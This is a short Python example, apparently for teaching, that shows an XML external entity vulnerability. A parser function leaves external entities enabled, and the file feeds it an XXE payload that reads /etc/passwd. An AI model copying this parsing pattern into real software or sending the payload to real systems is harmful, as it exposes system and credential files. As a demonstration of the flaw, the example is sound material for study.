import easyxml

# Example of vulnerable XML parsing
def parse_user_data(xml_input):
    # Directly parsing XML input without disabling external entities
    user_data = easyxml.parseXML(xml_input)
    return user_data

# Simulating an attacker-controlled XML input
attacker_xml = """<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">  <!-- Attacker-controlled entity -->
]>
<user>
  <name>&xxe;</name>  <!-- This will include the contents of /etc/passwd -->
</user>
"""

# Call the vulnerable function
try:
    user_info = parse_user_data(attacker_xml)
    print("User  Info:", user_info)
except Exception as e:
    print("An error occurred:", e)